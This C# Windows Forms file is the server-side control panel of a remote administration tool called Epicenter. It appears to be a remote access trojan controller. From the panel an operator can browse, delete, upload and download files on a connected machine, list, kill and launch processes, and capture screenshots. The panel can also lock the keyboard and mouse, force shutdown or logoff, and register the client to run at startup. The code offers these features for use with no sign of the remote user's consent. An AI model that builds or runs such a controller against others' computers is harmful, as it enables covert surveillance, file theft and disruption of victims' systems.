using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace Epicenter_SERVER
{
    public partial class administrate : Form
    {
        private NetworkStream ns;
        private string given_name;
        UTF8Encoding encoder = new UTF8Encoding();
        string ip = String.Empty;

        public administrate(string _given_name, NetworkStream _ns, string _IP)
        {
            InitializeComponent();

            // Importing the external variables
            given_name = _given_name;
            ns = _ns;
            this.Text = this.Text.Replace("%CLIENTNAME%", given_name);
            ip = _IP;

            // Trying to keep the looks good
            Panel coverage = new Panel();
            coverage.Location = new Point(200, -6);
            coverage.Size = new Size(398, 20);
            coverage.Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top;

            Controls.Add(coverage);
            coverage.BringToFront();
        }

        private void administrate_FormClosing(object sender, FormClosingEventArgs e)
        {
            commonData.ip_panel_pair.Remove(ip);
        }

        private void SendASCII(string command)
        {
            Thread thSend = new Thread(new ParameterizedThreadStart(SendASCII_Slave));
            thSend.Start(command);
        }

        private void SendASCII_Slave(object obj)
        {
            if (ns.CanWrite)
            {
                byte[] buff = encoder.GetBytes((string)obj);
                ns.Write(buff, 0, buff.Length);
            }
            else
                MessageBox.Show("EPICENTER is not able to fulfill your request.\n\nIf the client has reconnected, please re-open the administration panel.", "Connection Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);

        }


        #region Inter-Form Stuff -Inside a thread-
        public void reportIncomingComm(byte[] raw, int len)
        {
            // Calculating the length of the header and the type byte
            int lenPre = commonData.scheme.Length + 1;

            string incoming = encoder.GetString(raw, lenPre, len - lenPre);

            // Making sure that the message contains our seperator.
            if (!incoming.Contains("<%SEP%>"))
                return;

            string[] arguments = Regex.Split(incoming, "<%SEP%>");

            if (arguments[0] == "SYSPROP")
                SetText(lblSystemProperties, arguments[1]);
            else if (arguments[0] == "NETWPROP")
                SetText(lblNetworkProperties, arguments[1]);
            else if (arguments[0] == "PROCESS_LIST")
            {
                ClearItems(lbProcesses);
                for (int i = 1; i < arguments.Length; i++)
                {
                    if (!String.IsNullOrEmpty(arguments[i]))
                        AddItem(lbProcesses, arguments[i]);
                }
            }
            else if (arguments[0] == "EXPECT")
            {
                switch (arguments[1])
                {
                    case "filelist":
                        if (arguments[2] == "0") // Meaning that there is nothing located in the directory
                        {
                            AddLVItem(listFiles, "..", String.Empty, String.Empty);
                            SetEnabled(btnList, true);
                            return;
                        }

                        FilelistRecv.expectedLen = Convert.ToInt64(arguments[2]);
                        FilelistRecv.isExpecting = true;
                        FilelistRecv.stream = new byte[FilelistRecv.expectedLen];
                        FilelistRecv.myIndex = 0;
                        SetEnabled(btnList, false);
                        break;
                    default:
                        break;
                }
            }
            else if (arguments[0] == "DISPLAY")
            {
                MessageBox.Show(arguments[1], "A message from the client");
            }
            else if (arguments[0] == "STARTUP_STATUS_RESULT")
            {
                if (arguments.Length != 2)
                    return;

                if (arguments[1] == "PRESENT")
                    SetText(lblRegStatus, "PRESENT");
                else if (arguments[1] == "NONE")
                    SetText(lblRegStatus, "NONE");
            }
            
        }

        public void FrameworkSux_ArrayToArray(ref byte[] from, ref byte[] to, int to_index, int from_len)
        {
            for (int i = 0; i < from_len; i++)
                to[to_index + i] = from[i];
        }

        public void reportAmorphPack(byte[] raw, int len)
        {
            FrameworkSux_ArrayToArray(ref raw, ref FilelistRecv.stream, (int)FilelistRecv.myIndex, len);
            FilelistRecv.myIndex += (long)len;

            if (FilelistRecv.expectedLen == FilelistRecv.myIndex)
            {
                try
                {
                    string tempStr = encoder.GetString(FilelistRecv.stream);
                    FilelistRecv.isExpecting = false;
                    processFilelist(Regex.Split(tempStr, "<%SEP%>"));
                    SetEnabled(btnList, true);
                }
                catch
                {
                    SetEnabled(btnList, true);
                    MessageBox.Show("File list acquisition failed!", "Error Occured", MessageBoxButtons.OK, MessageBoxIcon.Error);  return;
                }
            }
        }


        public void Intermission()
        {
            MessageBox.Show(given_name + " has disconnected.\nYou may not be able to make requests.", "Notification", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        #endregion



        // For debugging
        private void btnSend_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(txtCommand.Text))
                return;

            SendASCII(txtCommand.Text);
        }

        // Auto-fetching network, system configuration, process list and file features
        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (tabControl1.SelectedIndex)
            {
                case 1:
                    if (lblSystemProperties.Text == "Retrieving... Please wait")
                        SendASCII("REQ_SYSPROP");
                    break;
                case 2:
                    if (lblNetworkProperties.Text == "Retrieving... Please wait")
                        SendASCII("REQ_NETWPROP");
                    break;
                case 7:
                    RequestProcessList();
                    break;
                case 9:
                    if(String.IsNullOrEmpty(txtLocation.Text))
                        txtLocation.Text = "C:\\";
                    RequestFileList(txtLocation.Text);
                    break;
                case 11:
                    SendASCII("STARTUP_STATUS");
                    break;
                default:
                    break;
            }
        }

        // MessageBox command
        private void btnDisplayMessage_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(txtMB_Message.Text) || String.IsNullOrEmpty(txtMB_Title.Text))
            {
                MessageBox.Show("Please fill the both fields.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            SendASCII("messagebox<%SEP%>" + txtMB_Message.Text + "<%SEP%>" + txtMB_Title.Text);
        }

        // PowerState
        private void btnControlPowerState_Click(object sender, EventArgs e)
        {
            if (rbShutdown.Checked)
                SendASCII("SHUTDOWN");
            else if (rbRestart.Checked)
                SendASCII("REBOOT");
            else if (rbLogoff.Checked)
                SendASCII("LOGOFF");
        }

        // Lockdown
        private void btnLock_Click(object sender, EventArgs e)
        {
            SendASCII("LOCKDOWN");
        }

        private void btnUnlock_Click(object sender, EventArgs e)
        {
            SendASCII("UNLOCKDOWN");
        }

        // Kill the remote process
        private void btnRemoteExit_Click(object sender, EventArgs e)
        {
            SendASCII("SUICIDE");
        }

        // Process Explorer
        private void RequestProcessList()
        {
            lbProcesses.Items.Clear();
            lbProcesses.Items.Add("Retrieving process list...");
            SendASCII("LIST_PROCS");
        }

        private void btnRefreshProcessList_Click(object sender, EventArgs e)
        {
            RequestProcessList();
        }

        private void btnKillProc_Click(object sender, EventArgs e)
        {
            if (lbProcesses.SelectedIndex != -1)
                SendASCII( "KILLPROC<%SEP%>" + lbProcesses.Items[lbProcesses.SelectedIndex] );

            System.Threading.Thread.Sleep(250);
            RequestProcessList();
        }

        private void btnLaunchProc_Click(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(txtProcessAddr.Text))
                SendASCII("LAUNCHPROC<%SEP%>" + txtProcessAddr.Text);

            System.Threading.Thread.Sleep(250);
            RequestProcessList();
        }

        // Capture Screenshot
        private void btnCaptureScreenshot_Click(object sender, EventArgs e)
        {
            int quality = 50;
            int port = 81;
            if (Int32.TryParse(txtQuality.Text, out quality) && quality > 0 && quality <= 100 && Int32.TryParse(txtSSPort.Text, out port) && port > 0)
            {
                FileServer fs = new FileServer(this, ip, port, Path.GetTempPath() + "\\remoteSS" + Guid.NewGuid().ToString() , String.Empty);
                fs.StartListeningForSS();
                SendASCII("GETSCREEN<%SEP%>" + txtQuality.Text + "<%SEP%>" + txtSSPort.Text);
                
                btnCaptureScreenshot.Text = "Processing...";
                btnCaptureScreenshot.Enabled = false;
                txtQuality.Enabled = false;
                txtSSPort.Enabled = false;

            }
            else
                MessageBox.Show("Please enter valid integers into the boxes.", "Type Conversion Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void ButtonToPrevState()
        {
            this.Invoke( (MethodInvoker) delegate{
                btnCaptureScreenshot.Text = "Capture";
                btnCaptureScreenshot.Enabled = true;
                txtQuality.Enabled = true;
                txtSSPort.Enabled = true;
            });
        }

        private void displayDScreen(object obj)
        {
            DisplayScreen ds = new DisplayScreen((string)obj);
            ds.ShowDialog();
        }

        public string ReportInSS
        {
            get { return String.Empty; }
            set
            {
                if (value.Contains("complete<%SEP%>"))
                {
                    ButtonToPrevState();

                    Thread displayThread = new Thread(new ParameterizedThreadStart(displayDScreen));
                    displayThread.Start( (object)(value.Substring(value.IndexOf("complete") + 15)) );

                    
                }
                else
                    SetText(lblSSstatus, value);
            }
        }

        // File Features
        private void RequestFileList(string location)
        {
            listFiles.Items.Clear();
            FilelistRecv.expectedLen = 0;
            SendASCII("LIST_DIRECTORY<%SEP%>" + location);
        }

        private void btnList_Click(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(txtLocation.Text))
            {
                if (!txtLocation.Text.EndsWith("\\"))
                    txtLocation.Text += "\\";
                RequestFileList(txtLocation.Text);
            }
            else
                MessageBox.Show("Please fill the location that you want to explore.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
        
        private void processFilelist(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if (!String.IsNullOrEmpty(args[i]))
                {
                    if(i==0)
                        AddLVItem(listFiles, "..", String.Empty, String.Empty);
                    string[] subInfos = Regex.Split(args[i], "<%FSEP%>");

                    if (subInfos.Length == 3)
                    {
                        if (subInfos[2] == "-" || subInfos[2] == "")
                        {
                            AddLVItem(listFiles, subInfos[0], subInfos[1], subInfos[2]);
                            continue;
                        }
                        // FileLen subInfos[2]
                        if (Convert.ToInt64(subInfos[2].Replace("KB", String.Empty)) > 1000)
                        {
                            AddLVItem(listFiles, subInfos[0], subInfos[1], (Convert.ToInt64(subInfos[2].Replace("KB", String.Empty)) / 1000).ToString() + " MB");
                        }
                        else
                        {
                            if (subInfos[2] == "0KB")
                                subInfos[2] = subInfos[2].Replace("0", "<1");
                            
                            AddLVItem(listFiles, subInfos[0], subInfos[1], subInfos[2].Replace("KB", " KB"));
                        }
                        
                    }
                        
                }
            }
        }

        private void btnFileDel_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItems.Count == 1)
            {
                switch(listFiles.SelectedItems[0].SubItems[1].Text)
                {
                    case "FOLDER":
                        SendASCII("DELETE_FOLDER<%SEP%>" + txtLocation.Text + listFiles.SelectedItems[0].SubItems[0].Text);
                        break;
                    case "FILE":
                        SendASCII("DELETE_FILE<%SEP%>" + txtLocation.Text + listFiles.SelectedItems[0].SubItems[0].Text);
                        break;
                    default:
                        break;
                }
                 
            }
        }
        
        private void listFiles_DoubleClick(object sender, EventArgs e)
        {
            if (btnList.Enabled == false)
                return;

            if(listFiles.SelectedItems.Count == 0)
                return;

            if (listFiles.SelectedItems[0].Index == 0 && listFiles.SelectedItems[0].SubItems[0].Text == "..")
            {
                string previousState = txtLocation.Text;
                txtLocation.Text = txtLocation.Text.Substring(0, txtLocation.Text.LastIndexOf("\\"));
                txtLocation.Text = txtLocation.Text.Substring(0, txtLocation.Text.LastIndexOf("\\") + 1);

                if (txtLocation.Text.Length < 3)
                    txtLocation.Text = previousState;
                else
                    RequestFileList(txtLocation.Text);
            }
            else
            {
                if (String.IsNullOrEmpty(txtLocation.Text) || listFiles.SelectedItems[0].SubItems[1].Text != "FOLDER")
                    return;

                if (!txtLocation.Text.EndsWith("\\"))
                    txtLocation.Text += "\\";

                txtLocation.Text += listFiles.SelectedItems[0].SubItems[0].Text + "\\";
                RequestFileList(txtLocation.Text);
            }
        }
        
        private void btnFileDownload_Click(object sender, EventArgs e)
        {
            int transfPort = 0;
            if (!Int32.TryParse(txtTransferPort.Text, out transfPort))
            {
                MessageBox.Show("Please put in a valid port before requesting a file.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            
            if (listFiles.SelectedItems.Count != 1)
                return;

            if (listFiles.SelectedItems[0].SubItems[1].Text != "FILE")
                return;

            SaveFileDialog sfd = new SaveFileDialog();

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                FileServer fs = new FileServer(this ,ip, transfPort, sfd.FileName, String.Empty);
                fs.StartListeningForFile();

                SendASCII("SEND_FILE<%SEP%>" + txtLocation.Text + listFiles.SelectedItems[0].SubItems[0].Text + "<%SEP%>" + txtTransferPort.Text);
                SetText(lblStatus, "REQUEST sent. Awaiting for initial data.");
            }
        }

        private void btnFileUpload_Click(object sender, EventArgs e)
        {
            int transfPort = 0;
            if (!Int32.TryParse(txtTransferPort.Text, out transfPort))
            {
                MessageBox.Show("Please put in a valid port before requesting a file.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (String.IsNullOrEmpty(txtLocation.Text))
                return;

            FileUploadDisplay display = new FileUploadDisplay(this, txtLocation.Text);

            if (display.ShowDialog() == DialogResult.OK)
            {
                FileServer fs = new FileServer(this, ip, transfPort, String.Empty, _toUpload_local);
                fs.StartListeningForUpload();

                SendASCII("GETREADY_RECV_FILE<%SEP%>" + _toUpload_remote + "<%SEP%>" + txtTransferPort.Text);
            }
        }

        string _toUpload_local;
        public string toUpload_local
        {
            get { return String.Empty; }
            set
            {
                _toUpload_local = value;
            }
        }

        string _toUpload_remote;
        public string toUpload_remote
        {
            get { return String.Empty; }
            set
            {
                _toUpload_remote = value;
            }
        }
        


        public string ReportIn
        {
            get { return String.Empty; }
            set
            {
                SetText(lblStatus, value);
            }
        }

        // Add yourself to registry
        private void btnRegistery_Click(object sender, EventArgs e)
        {
            SendASCII("BIND_TO_START");
        }
        
        
        // TODO: Implementation of the CMD control system.




        #region GUI Stuff
        private void tvFunctions_AfterSelect(object sender, TreeViewEventArgs e)
        {
            switch (tvFunctions.SelectedNode.Text)
            {
                case "General Information":
                    tabControl1.SelectedIndex = 0;
                    break;
                case "System":
                    tabControl1.SelectedIndex = 1;
                    break;
                case "Network":
                    tabControl1.SelectedIndex = 2;
                    break;
                case "Administrative Features":
                    tabControl1.SelectedIndex = 3;
                    break;
                case "Display a message":
                    tabControl1.SelectedIndex = 4;
                    break;
                case "Control the power state":
                    tabControl1.SelectedIndex = 5;
                    break;
                case "Lock keyboard and mouse":
                    tabControl1.SelectedIndex = 6;
                    break;
                case "Start or kill processes":
                    tabControl1.SelectedIndex = 7;
                    break;
                case "Take screenshots":
                    tabControl1.SelectedIndex = 8;
                    break;
                case "Other":
                    tabControl1.SelectedIndex = 11;
                    break;
                case "Manage remote files":
                    tabControl1.SelectedIndex = 9;
                    break;
                case "Access the command line":
                    tabControl1.SelectedIndex = 10;
                    break;
                default:
                    break;

            }
        }
        
        private void txtDisplayCMD_Click(object sender, EventArgs e)
        {
            txtCMDcommand.Focus();
        }
        
        private void txtLocation_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == 13 && btnList.Enabled)
                btnList_Click(sender, e);
        }
        
        private void txtProcessAddr_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == 13)
                btnLaunchProc_Click(sender, e);
        }
        #endregion

        #region Delegates
        public delegate void ControlBoolConsumer(Control control, bool isIt);
        public void SetEnabled(Control control, bool isIt)
        {
            if (control.InvokeRequired)
                control.Invoke(new ControlBoolConsumer(SetEnabled), new object[] { control, isIt });
            else
                control.Enabled = isIt;
        }

        public delegate void ControlStringConsumer(Control control, string text);
        public void SetText(Control control, string text)
        {
            if (control.InvokeRequired)
                control.Invoke(new ControlStringConsumer(SetText), new object[] { control, text });
            else
                control.Text = text;
        }

        public delegate void LBStringConsumer(ListBox listbox, string text);
        public void AddItem(ListBox listbox, string text)
        {
            if (this.InvokeRequired)
                this.Invoke(new LBStringConsumer(AddItem), new object[] { listbox, text });
            else
                listbox.Items.Add(text);
        }

        public delegate void LBConsumer(ListBox listbox);
        public void ClearItems(ListBox listbox)
        {
            if (this.InvokeRequired)
                this.Invoke(new LBConsumer(ClearItems), new object[] { listbox });
            else
                listbox.Items.Clear();
        }

        public delegate void LVStringConsumer(ListView view, string textA, string textB, string textC);
        public void AddLVItem(ListView view, string textA, string textB, string textC)
        {
            if (this.InvokeRequired)
                this.Invoke(new LVStringConsumer(AddLVItem), new object[] { view, textA, textB, textC });
            else
                view.Items.Add(new ListViewItem(new string[] { textA, textB, textC }));
        }
        #endregion 

        
    }
}
